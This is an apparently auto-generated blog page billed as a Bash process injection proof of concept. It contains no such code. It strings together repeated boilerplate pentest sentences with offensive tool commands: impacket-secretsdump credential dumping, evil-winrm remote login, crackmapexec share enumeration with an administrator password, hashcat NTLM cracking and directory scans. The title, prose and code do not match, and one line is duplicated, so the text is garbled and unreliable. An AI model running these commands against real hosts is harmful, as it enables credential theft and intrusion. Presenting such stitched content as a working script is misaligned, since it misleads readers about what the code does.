---
TitleSEO: "Process Injection PoC in Bash | ZureFX"
TitlePost: "Process Injection PoC — Bash"
Author: "ZureFX"
Description: "A Bash script for process injection poc. Built for security research and automation."
Keywords: "powershell, script, scanner, parser, python, c, bash"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-626.html"
URL_IMAGES: ""
Date: "2024-02-02"
Tags: "PowerShell, Script, Scanner, Parser, Python, C, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-626"
Permalink: "/scripting/script-process-injection-poc-626.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `hashcat`
- `evil-winrm`
- `psexec`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.70.124.133
```

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.13.209.82 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1433,5986,464 10.70.18.129 -oN scan.txt
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.202.82
gobuster dir -u http://10.29.198.88/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.117.119.33 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.124.9.46/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 13.34s
```
